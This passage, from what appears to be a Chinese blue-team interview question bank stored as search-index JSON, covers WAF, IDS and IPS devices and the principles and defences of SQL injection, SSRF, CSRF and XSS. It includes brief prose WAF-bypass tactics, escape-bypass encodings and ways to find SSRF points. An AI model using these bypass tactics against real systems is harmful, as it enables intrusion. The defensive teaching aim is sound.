\u6f0f\u6d1e\u672c\u8eab\u5e76\u4e0d\u80fd\u63d0\u4f9b\u53ef\u5229\u7528\u7684\u9014\u5f84\u3002\u7531\u4e8e\u60a8\u65e0\u6cd5\u67e5\u770b\u6765\u81ea\u540e\u7aef\u8bf7\u6c42\u7684\u54cd\u5e94\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f7f\u7528\u8be5\u884c\u4e3a\u6765\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u53ef\u4ee5\u8bbf\u95ee\u7684\u7cfb\u7edf\u4e0a\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u4ecd\u7136\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u63a2\u6d4b\u670d\u52a1\u5668\u672c\u8eab\u6216\u5176\u4ed6\u540e\u7aef\u7cfb\u7edf\u4e0a\u7684\u5176\u4ed6\u6f0f\u6d1e\u3002\u60a8\u53ef\u4ee5\u76f2\u76ee\u5730\u626b\u63cf\u5185\u90e8 IP \u5730\u5740\u7a7a\u95f4\uff0c\u53d1\u9001\u65e8\u5728\u68c0\u6d4b\u5df2\u77e5\u6f0f\u6d1e\u7684\u6709\u6548\u8d1f\u8f7d\u3002\u5982\u679c\u8fd9\u4e9b\u6709\u6548\u8f7d\u8377\u8fd8\u91c7\u7528\u4e86\u76f2\u5e26\u5916\u6280\u672f\uff0c\u90a3\u4e48\u60a8\u53ef\u80fd\u4f1a\u5728\u672a\u6253\u8865\u4e01\u7684\u5185\u90e8\u670d\u52a1\u5668\u4e0a\u53d1\u73b0\u4e00\u4e2a\u4e25\u91cd\u6f0f\u6d1e\u3002</p> <p>\u53e6\u4e00\u79cd\u5229\u7528\u76f2SSRF\u6f0f\u6d1e\u7684\u9014\u5f84\u662f\u8bf1\u4f7f\u5e94\u7528\u7a0b\u5e8f\u8fde\u63a5\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\uff0c\u5e76\u5411\u5efa\u7acb\u8fde\u63a5\u7684HTTP\u5ba2\u6237\u7aef\u8fd4\u56de\u6076\u610f\u54cd\u5e94\u3002\u5982\u679c\u60a8\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u5668 HTTP \u5b9e\u73b0\u4e2d\u7684\u4e25\u91cd\u5ba2\u6237\u7aef\u6f0f\u6d1e\uff0c\u60a8\u53ef\u80fd\u80fd\u591f\u5728\u5e94\u7528\u7a0b\u5e8f\u57fa\u7840\u67b6\u6784\u4e2d\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/","title":"\u9898\u5e93","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#hw","title":"HW\u9762\u8bd5\u5b98\u4e86\u89e3\u60c5\u51b5","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_2","title":"\u62a4\u7f51\u62c5\u4efb\u89d2\u8272","text":"<p>\u76d1\u63a7 \u7814\u5224 \u5904\u7f6e</p> <p>\u5e94\u6025</p> <p>\u6eaf\u6e90</p> <p>\u5e26\u961f</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_3","title":"\u63a5\u89e6\u8fc7\u54ea\u4e9b\u5b89\u5168\u8bbe\u5907","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#waf","title":"Waf","text":"<p>(\u542f\u660e\u661f\u8fb0 \u5929\u6e05WEB\u5e94\u7528\u5b89\u5168\u7f51\u5173)</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#ips","title":"IPS","text":"<p>(\u542f\u660e\u661f\u8fb0 \u5929\u6e05\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf)</p> <p>\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\u4e00\u822c\u4e5f\u662f\u5728\u7f51\u7edc\u5c42\u65c1\u8def\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5177\u5907\u963b\u65ad\u80fd\u529b\u7684IDS\uff0c\u662fIDS\u7684\u5347\u7ea7\u7248\uff08\u4e5f\u6709IDS\u68c0\u6d4b\u5230\u653b\u51fb\u901a\u77e5\u963b\u65ad\u8bbe\u5907\u6267\u884c\u963b\u65ad\u52a8\u4f5c\u7684\u8bbe\u5907\u8054\u52a8\u6a21\u5f0f\uff09\uff0c\u53ef\u4ee5\u8986\u76d6\u7f51\u7edc\u5c42\u548c\u5e94\u7528\u5c42\uff09</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#idsintrusion-detection-system","title":"IDS(Intrusion-Detection System)","text":"<p>\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_4","title":"\u539f\u7406","text":"<p>IDS\u5de5\u4f5c\u5728\u7f51\u7edc\u5c42\uff0c\u65c1\u8def\u90e8\u7f72\uff0c\u901a\u8fc7\u6293\u53d6\u548c\u5206\u6790\u7f51\u7edc\u6d41\u91cf\u6765\u53d1\u73b0\u653b\u51fb</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#hids-host-based-intrusion-detection-system","title":"HIDS (Host-based Intrusion Detection System)","text":"<p>\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08\u9752\u85e4\u4e91\u8bbe\u5907 \u5947\u5b89\u4fe1\u6912\u56fe\uff09</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_5","title":"\u539f\u7406","text":"<p>\u4f5c\u4e3a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u76d1\u89c6\u5668\u548c\u5206\u6790\u5668\uff0c\u4e13\u6ce8\u4e8e\u7cfb\u7edf\u5185\u90e8\uff0c\u76d1\u89c6\u4e3b\u673a\u7684\u52a8\u6001\u884c\u4e3a\u4ee5\u53ca\u6574\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u72b6\u6001\u3002\u80fd\u5bf9\u68c0\u6d4b\u7684\u5165\u4fb5\u884c\u4e3a\u505a\u51fa\u5feb\u901f\u7684\u54cd\u5e94\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_6","title":"\u524d\u671f\u51c6\u5907\u5de5\u4f5c","text":"<p>\u57fa\u7ebf\u68c0\u67e5\u3001\u7ea2\u961f\u6f14\u4e60\u3001\u5b89\u5168\u52a0\u56fa</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_7","title":"\u9898\u5e93","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_8","title":"\u5b89\u5168\u8bbe\u5907","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#waf_1","title":"WAF\u7ed5\u8fc7","text":"<p>1.fuzz \u786e\u8ba4\u62e6\u622a\u4e86\u4ec0\u4e48\u51fd\u6570</p> <p>1.\u8f93\u5165\u53c2\u6570\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff08intval\u7b49\uff09</p> <p>2.\u8f93\u5165\u53c2\u6570\u5408\u6cd5\u6027\u68c0\u6d4b</p> <p>3.\u5173\u952e\u51fd\u6570\u6267\u884c\uff08SQL\u6267\u884c\u3001\u9875\u9762\u663e\u793a\u3001\u547d\u4ee4\u6267\u884c\u7b49\uff09\u524d\uff0c\u5bf9\u7ecf\u8fc7\u4ee3\u7801\u6d41\u7a0b\u7684\u8f93\u5165\u8fdb\u884c\u68c0\u6d4b</p> <p>4.\u5bf9\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u66ff\u6362\u8fc7\u6ee4\u540e\u518d\u7ee7\u7eed\u6267\u884c\u4ee3\u7801\u6d41\u7a0b\uff08\u8f6c\u4e49/\u66ff\u6362\u7279\u6b8a\u5b57\u7b26\u7b49\uff09</p> <p>\u5927\u5c0f\u5199\u6df7\u5199</p> <p>\u66ff\u6362\u5173\u952e\u5b57</p> <p>\u4f7f\u7528\u6ce8\u91ca</p> <p>\u591a\u53c2\u6570\u8bf7\u6c42\u62c6\u5206</p> <p>\u5c06GET\u7684\u53c2\u6570a\u548c\u53c2\u6570b\u62fc\u63a5\u5230SQL\u8bed\u53e5\u4e2d</p> <p>HTTP\u53c2\u6570\u6c61\u67d3</p> <p>\u751f\u50fb\u5b57\u51fd\u6570</p> <p>\u5bfb\u627e\u7f51\u7ad9\u6e90\u7ad9IP</p> <p>\u5e38\u89c1\u7684\u5bfb\u627e\u7f51\u7ad9IP\u65b9\u6cd5\u6709\u4e0b\u9762\u51e0\u79cd</p> <p>\u5bfb\u627e\u7f51\u7ad9\u7684\u5386\u53f2\u89e3\u6790\u8bb0\u5f55</p> <p>\u591a\u4e2a\u4e0d\u540c\u533a\u57dfping\u7f51\u7ad9\uff0c\u67e5\u770bIP\u89e3\u6790\u7684\u7ed3\u679c</p> <p>\u627e\u7f51\u7ad9\u7684\u4e8c\u7ea7\u57df\u540d\u3001NS\u3001MX\u8bb0\u5f55\u7b49\u5bf9\u5e94IP</p> <p>\u8ba2\u9605\u7f51\u7ad9\u90ae\u4ef6\uff0c\u67e5\u770b\u90ae\u4ef6\u53d1\u9001\u65b9\u7684IP</p> <p>\u7b2c\u4e00:\u4fee\u6539\u5ba2\u6237\u7aefip</p> <p>\u7b2c\u4e8c:\u51cf\u6162\u626b\u63cf\u901f\u5ea6</p> <p>\u7b2c\u4e09:\u901a\u8fc7\u4ee3\u7406\u6b3a\u9a97waf</p> <p>Github\uff08\u7ed9\u7684\u5bb3\u4e0d\uff09\u6709\u5b57\u5178</p> <p>\u53d1\u5b50\uff08fuzz\uff09</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#web-top10","title":"Web Top10","text":"<p>\\1. SQL\u6ce8\u5165 </p> <p>\\2. \u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1 </p> <p>\\3. \u654f\u611f\u6570\u636e\u6cc4\u9732 </p> <p>\\4. XML\u5916\u90e8\u5b9e\u4f53\uff08XXE\uff09 </p> <p>\\5. \u5931\u6548\u7684\u8bbf\u95ee\u63a7\u5236 </p> <p>\\6. \u5b89\u5168\u914d\u7f6e\u9519\u8bef </p> <p>\\7. \u8de8\u7ad9\u811a\u672c\uff08XSS\uff09 </p> <p>\\8. \u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316 </p> <p>\\9. \u4f7f\u7528\u542b\u6709\u5df2\u77e5\u6f0f\u6d1e\u7684\u7ec4\u4ef6 </p> <p>\\10. \u4e0d\u8db3\u7684\u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#sql","title":"SQL\u6ce8\u5165\u539f\u7406","text":"<p># WEB\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e </p> <p># \u6ca1\u6709\u8fc7\u6ee4\u6216\u8005\u8fc7\u6ee4\u7684\u4e0d\u4e25\u8c28 </p> <p># \u5e76\u4e14\u628a\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u5f53\u4f5cSQL \u8bed\u53e5 </p> <p># \u5e26\u5165\u5230\u6570\u636e\u4e2d\u53bb\u6267\u884c</p> <p>\u5f53\u7a0b\u5e8f\u6267\u2f8f\u8bbf\u95ee\u65b0\u95fb\u7b49\u2f00\u4e9b\u64cd\u4f5c\u90fd\u4f1a\u6267\u2f8f\u5230 sql \u8bed\u53e5\u8fdb\u2f8f\u8c03\u2f64\uff0c\u5982\u679c\u5728\u6b64\u8c03\u2f64\u8fc7\u7a0b\u4e2d\uff0c\u63d0\u4ea4\u4e86\u4e0d\u5408\u6cd5\u7684\u6570\u636e\uff0c\u2f7d\u6570\u636e\u5e93 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#2-sql","title":"2-SQL\u6ce8\u5165\u5206\u7c7b","text":"<p># \u4ece\u53cd\u9988\u7ed3\u679c\u6765\u5206 </p> <p>1-\u56de\u663e\u578b </p> <p>2-\u65e0\u56de\u663e\u578b/\u76f2\u6ce8 </p> <p># \u4ece\u653b\u51fb\u624b\u6cd5\u4e0a\u6765\u5206 </p> <p>1-\u8054\u5408\u67e5\u8be2\u6ce8\u5165 union select </p> <p>2-\u5806\u53e0\u6ce8\u5165 \uff1b </p> <p>3-\u62a5\u9519\u6ce8\u5165 updatexml\u3001floor\u3001ExtractValue \u3001exp\u5176\u4ed6\u7684\u7528\u7684\u4e0d\u591a\u4e0d\u7528\u8bf4 </p> <p>4-\u76f2\u6ce8</p> <p>4.1-\u5e03\u5c14\u76f2\u6ce8 </p> <p>4.2-\u65f6\u95f4\u76f2\u6ce8</p> <p>\u6ce8\u2f0a\u7c7b\u578b\u6709 6 \u79cd\uff0c\u53ef\u4ee5\u53c2\u8003 SQLMAP\uff0c\u62a5\u9519\u3001\u76f2\u6ce8\u3001\u8054\u5408\u3001\u65f6\u95f4\u3001\u5185\u8054\u3001\u5806\u53e0</p> <p>\u6ce8\u2f0a\u63d0\u4ea4\u2f45\u5f0f\uff1aGET\u3001POST\u3001Cookies\u3001\u2f42\u4ef6\u5934</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_9","title":"\u4e03\u3001\u76f2\u6ce8\u662f\u4ec0\u4e48\uff1f\u600e\u4e48\u76f2\u6ce8\uff1f","text":"<p>\u76f2\u6ce8\u662f\u5728 SQL \u6ce8\u2f0a\u653b\u51fb\u8fc7\u7a0b\u4e2d\uff0c\u670d\u52a1\u5668\u5173\u95ed\u4e86\u9519\u8bef\u56de\u663e\uff0c\u6211\u4eec\u5355\u7eaf\u901a\u8fc7\u670d\u52a1\u5668\u8fd4\u56de\u5185\u5bb9\u7684\u53d8\u5316\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728 SQL \u6ce8 </p> <p>\u2f0a\u548c\u5229\u2f64\u7684\u2f45\u5f0f\u3002\u76f2\u6ce8\u7684\u2f3f\u6bb5\u6709\u4e24\u79cd\uff0c\u2f00\u4e2a\u662f\u901a\u8fc7\u2eda\u2faf\u7684\u8fd4\u56de\u5185\u5bb9\u662f\u5426\u6b63\u786e (boolean-based)\uff0c\u6765\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u6ce8\u2f0a\u3002 </p> <p>\u2f00\u4e2a\u662f\u901a\u8fc7 sql \u8bed\u53e5\u5904\u7406\u65f6\u95f4\u7684\u4e0d\u540c\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u6ce8\u2f0a (time-based)\uff0c\u5728\u8fd9\u2fa5\uff0c\u53ef\u4ee5\u2f64 benchmark\uff0csleep \u7b49\u9020\u6210\u5ef6 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_10","title":"\u5982\u4f55\u7a81\u7834\u6ce8\u5165\u65f6\u5b57\u7b26\u88ab\u8f6c\u4e49\uff1f","text":"<ul> <li>\u5bbd\u5b57\u7b26\u6ce8\u5165</li> <li>hex\u7f16\u7801\u7ed5\u8fc7</li> </ul>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#3-sql","title":"3-SQL\u6ce8\u5165\u9632\u5fa1","text":"<p># \u4ee3\u7801\u5c42\u9632\u5fa1 </p> <p>1-\u5bf9\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u8f6c\u4e49\uff08PHP\u4e2daddslashes()\u3001mysql_real_escape()\u51fd\u6570\uff09\u3002 </p> <p>2-\u9650\u5236\u5173\u952e\u5b57\u7684\u8f93\u5165\uff08PHP\u4e2dpreg_replace()\u51fd\u6570\u6b63\u5219\u66ff\u6362\u5173\u952e\u5b57\uff09\uff0c\u9650\u5236\u8f93\u5165\u7684\u957f\u5ea6 \u3002 </p> <p>3-\u4f7f\u7528SQL\u8bed\u53e5\u9884\u5904\u7406\uff0c\u5bf9SQL\u8bed\u53e5\u9996\u5148\u8fdb\u884c\u9884\u7f16\u8bd1\uff0c\u7136\u540e\u8fdb\u884c\u53c2\u6570\u7ed1\u5b9a\uff0c\u6700\u540e\u4f20\u5165\u53c2\u6570\u3002 </p> <p># \u7f51\u7edc\u5c42\u9762 </p> <p>\u90e8\u7f72\u9632\u62a4\u5899\u548c\u8f6f\u786cWAF</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#ssrf","title":"SSRF\u539f\u7406","text":"<p>\u670d\u52a1\u5668\u8bf7\u6c42\u4f2a\u9020\uff0c\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\uff0c\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u8fc7\u6ee4\u4e0e\u9650\u5236\uff0c\u670d\u52a1\u5668\u5c31\u4ee5\u670d\u52a1\u5668\u81ea\u5df1\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u5668\u7684\u8d44\u6e90\u3002</p> <p>1- \u670d\u52a1\u5668\u5141\u8bb8\u5411\u5176\u4ed6\u670d\u52a1\u5668\u83b7\u53d6\u8d44\u6e90 </p> <p>2- \u4f46\u662f\u5e76\u6ca1\u6709\u5bf9\u8be5\u5730\u5740\u505a\u4e25\u683c\u7684\u8fc7\u6ee4\u548c\u9650\u5236 </p> <p>3- \u6240\u4ee5\u5bfc\u81f4\u4e86\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u53d7\u5bb3\u8005\u670d\u52a1\u5668\uff0c\u4f20\u5165\u4efb\u610f\u7684URL \u5730\u5740\uff0c\u5e76\u5c06\u6570\u636e\u8fd4\u56de</p> <p>SSRF\u5371\u5bb3</p> <p>1- SSRF\u6f0f\u6d1e\u51e0\u4e4e\u65e0\u6240\u4e0d\u80fd </p> <p>2- SQL\u6ce8\u5165 </p> <p>3- Sturts2 \uff08\uff09 </p> <p>4- \u7aef\u53e3\u63a2\u6d4b </p> <p>5- \u654f\u611f\u4fe1\u606f\u6cc4\u9732 </p> <p># \u6700\u4e3a\u4e3b\u8981\u7684\u5c31\u662f\u80fd\u591f\u8bbf\u95ee\u5230\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u7cfb\u7edf\u548c\u670d\u52a1\u5668\uff0c\u6f2b\u6e38\u5185\u7f51</p> <p>SSRF\u9632\u5fa1</p> <p>1- \u5730\u5740\u505a\u767d\u540d\u5355\u5904\u7406 </p> <p>2- \u57df\u540d\u8bc6\u522bip,\u8fc7\u6ee4\u5185\u90e8ip </p> <p>3- \u5e76\u6821\u9a8c\u8fd4\u56de\u7684\u5185\u5bb9\u5bf9\u6bd4\u662f\u5426\u4e0e\u5047\u5b9a\u7684\u4e00\u81f4</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#ssrf_1","title":"SSRF\u6316\u6398","text":"<p>1.\u5206\u4eab\uff1a\u901a\u8fc7URL\u5730\u5740\u5206\u4eab\u7f51\u9875\u5185\u5bb9</p> <p>2.\u8f6c\u7801\u670d\u52a1</p> <p>3.\u5728\u7ebf\u7ffb\u8bd1</p> <p>4.\u56fe\u7247\u52a0\u8f7d\u4e0e\u4e0b\u8f7d\uff1a\u901a\u8fc7URL\u5730\u5740\u52a0\u8f7d\u6216\u4e0b\u8f7d\u56fe\u7247</p> <p>5.\u56fe\u7247\u3001\u6587\u7ae0\u6536\u85cf\u529f\u80fd</p> <p>6.\u672a\u516c\u5f00\u7684api\u5b9e\u73b0\u4ee5\u53ca\u5176\u4ed6\u8c03\u7528URL\u7684\u529f\u80fd</p> <p>7.\u4eceURL\u5173\u952e\u5b57\u4e2d\u5bfb\u627e\uff0cShare\u3001wap\u3001url\u3001link\u3001src\u3001source\u3001target\u3001u\u30013g\u3001display\u3001sourceURL\u3001imageURL\u3001domain</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#csrf","title":"CSRF\u653b\u51fb\u539f\u7406","text":"<p>\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u5728\u7f51\u9875\u6e90\u4ee3\u7801\u4e2d\u63d2\u5165js\u4ee3\u7801\uff0c\u4f7f\u7528js\u4ee3\u7801\u7ed9\u5176\u4ed6\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u90a3\u4e48\u56e0\u4e3a\u5728\u53d1\u9001\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u7684\u628acookie\u53d1\u9001\u7ed9\u5bf9\u5e94\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u65f6\u5019\u76f8\u5e94\u7684\u670d\u52a1\u5668\uff08\u6bd4\u5982ICBC\u7f51\u7ad9\uff09\uff0c\u5c31\u4e0d\u77e5\u9053\u8fd9\u4e2a\u8bf7\u6c42\u662f\u4f2a\u9020\u7684\uff0c\u5c31\u88ab\u6b3a\u9a97\u8fc7\u53bb\u4e86\u3002\u4ece\u800c\u8fbe\u5230\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u7ed9\u67d0\u4e2a\u670d\u52a1\u5668\u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\uff08\u6bd4\u5982\u8f6c\u8d26\uff09\u3002</p> <p>1- \u7528\u6237\u5728\u7edf\u4e00\u6d4f\u89c8\u5668\u4e0b </p> <p>2- \u6ca1\u6709\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u60c5\u51b5\u4e0b </p> <p>3- \u8bbf\u95ee\u4e86\u653b\u51fb\u8005\u7cbe\u5fc3\u4f2a\u88c5\u597d\u7684\u6076\u610f\u94fe\u63a5</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xss","title":"XSS\u539f\u7406","text":"<p>1-XSS\u6f0f\u6d1e\u662f\u8de8\u7ad9\u811a\u672c\u653b\u51fb </p> <p>2-\u662fHTML\u4ee3\u7801\u7684\u6ce8\u5165 </p> <p>3-\u4ed6\u662f\u901a\u8fc7\u5bf9\u7f51\u9875\uff0c\u6ce8\u5165\u6d4f\u89c8\u5668\u53ef\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u5b9e\u73b0\u7684\u653b\u51fb\u624b\u6bb5\u3002</p> <p>web\u9875\u9762\u63d2\u5165\u6076\u610fJs\u4ee3\u7801\uff0c\u6d4f\u89c8\u5668\u89e3\u6790\u6267\u884c\u83b7\u53d6\u7528\u6237cookie\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xss_1","title":"xss\u9632\u5fa1","text":"<ol> <li>\u6b63\u5219\u8fc7\u6ee4\uff08\u6807\u7b7e/js\u4ee3\u7801/\u4e8b\u4ef6\uff09</li> <li>\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884chtml\u7f16\u7801\u8f93\u51fa\uff08\u65e0\u6cd5\u8fdb\u884c\u95ed\u5408\uff09</li> <li>\u670d\u52a1\u7aef\u8bbe\u7f6e\u4f1a\u8bddCookie\u7684HTTP Only\u5c5e\u6027\uff08\u4e0d\u80fd\u83b7\u53d6cookie\uff09</li> </ol>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xss_2","title":"\u5b58\u50a8\u578b xss \u539f\u7406?","text":"<p>\u5982\u2f79\u7ad9\u7559\u2f94\u7248\uff0c\u628a\u63d2\u2f0a\u7684\u8bb0\u5f55\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u63d2\u2f0a\u7684\u4ee3\u7801\u4f1a\u2f00\u76f4\u7559\u5728\u2eda\u2faf\u4e0a\uff0c\u5f53\u5176\u5b83\u2f64\u6237\u8bbf\u95ee\u4f1a\u4ece\u6570\u636e\u5e93\u4e2d\u8bfb\u53d6\u5e76\u89e6\u53d1</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xss_3","title":"Xss\u5206\u7c7b","text":"<p>1-\u53cd\u5c04\u578b </p> <p>2-\u5b58\u50a8\u578b </p> <p>3-DOM\u578b</p> <p># \u53cd\u5c04\u578b \u548c \u5b58\u50a8\u578b </p> <p>\u90fd\u9700\u9700\u8981\u7ecf\u8fc7\u670d\u52a1\u5668\u89e3\u6790\uff0c\u5e76\u4e0e\u6570\u636e\u5e93\u4ea7\u751f\u4ea4\u4e92 </p> <p># DOM \u578b </p> <p>\u53ea\u9700\u8981\u7ecf\u8fc7\u524d\u7aef\u89e3\u6790\uff0c\u4e0d\u4e0e\u6570\u636e\u5e93\u4ea7\u751f\u4ea4\u4e92 </p> <p># \u5b58\u50a8\u578b \u548c DOM\u578b </p> <p>\u90fd\u4f1a\u5c06\u653b\u51fb\u4ee3\u7801\u957f\u671f\u5b58\u5728\u53d7\u5bb3\u8005\u670d\u52a1\u5668 </p> <p># \u53cd\u5c04\u578b </p> <p>\u800c\u53cd\u5c04\u578b\uff0c\u53ea\u4f1a\u53cd\u5f39\u4e00\u6b21\u653b\u51fb\u4ee3\u7801</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xsscsrfssrf","title":"XSS,CSRF,SSRF\u4e09\u79cd\u6f0f\u6d1e\u7684\u533a\u522b\u548c\u5171\u540c\u70b9","text":"<p>\u76f8\u540c\u70b9\uff1a</p> <p>XSS\uff0cCSRF,SSRF\u4e09\u79cd\u5e38\u89c1\u7684Web\u670d\u52a1\u7aef\u6f0f\u6d1e\u5747\u662f\u7531\u4e8e\uff0c\u670d\u52a1\u5668\u7aef\u5bf9\u7528\u6237\u63d0\u4f9b\u7684\u53ef\u63a7\u6570\u636e\u8fc7\u4e8e\u4fe1\u4efb\u6216\u8005\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4\u7684\u3002</p> <p>\u4e0d\u540c\u70b9\uff1a</p> <p>XSS\u662f\u670d\u52a1\u5668\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u5728\u6e32\u67d3\u670d\u52a1\u5668\u8fd4\u56de\u7684html\u9875\u9762\u65f6\uff0c\u51fa\u73b0\u4e86\u9884\u671f\u503c\u4e4b\u5916\u7684 \u811a\u672c\u8bed\u53e5\u88ab\u6267\u884c\u3002</p> <p>CSRF\u662f\u670d\u52a1\u5668\u7aef\u6ca1\u6709\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u968f\u673a\u503c\u6821\u9a8c\uff0c\u4e14\u5bf9http\u8bf7\u6c42\u5305\u5185\u7684refer\u5b57\u6bb5\u6821\u9a8c\u4e0d\u4e25\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5 \u5229\u7528\u7528\u6237\u7684Cookie\u4fe1\u606f\u4f2a\u9020\u7528\u6237\u8bf7\u6c42\u53d1\u9001\u81f3\u670d\u52a1\u5668\u3002   </p> <p>SSRF\u662f\u670d\u52a1\u5668\u5bf9 \u7528\u6237\u63d0\u4f9b\u7684\u53ef\u63a7URL\u8fc7\u4e8e\u4fe1\u4efb\uff0c\u6ca1\u6709\u5bf9\u653b\u51fb\u8005\u63d0\u4f9b\u7684RUL\u8fdb\u884c\u5730\u5740\u9650\u5236\u548c\u8db3\u591f\u7684\u68c0\u6d4b\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u8df3\u677f\u653b\u51fb\u5185\u7f51\u6216\u5176\u4ed6\u670d\u52a1\u5668\u3002</p> <ul> <li>CSRF\u662f\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u653b\u51fb\uff0c\u7531\u5ba2\u6237\u7aef\u53d1\u8d77</li> <li>SSRF\u662f\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u7531\u670d\u52a1\u5668\u53d1\u8d77</li> <li>\u91cd\u653e\u653b\u51fb\u662f\u5c06\u622a\u83b7\u7684\u6570\u636e\u5305\u8fdb\u884c\u91cd\u653e\uff0c\u8fbe\u5230\u8eab\u4efd\u8ba4\u8bc1\u7b49\u76ee\u7684</li> </ul>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#1","title":"1\u3001\u2fa6\u878d\u2f8f\u4e1a\u5e38\u2ec5\u903b\u8f91\u6f0f\u6d1e","text":"<p>\u5355\u9488\u5bf9\u2fa6\u878d\u4e1a\u52a1\u7684 \u4e3b\u8981\u662f\u6570\u636e\u7684\u7be1\u6539 (\u6d89\u53ca\u2fa6\u878d\u6570\u636e\uff0c\u6216\u90e8\u5206\u4e1a\u52a1\u7684\u5224\u65ad\u6570\u636e)\uff0c\u7531\u7ade\u4e89\u6761\u4ef6\u6216\u8005\u8bbe\u8ba1\u4e0d\u5f53\u5f15\u8d77\u7684\u8585\u2f7a 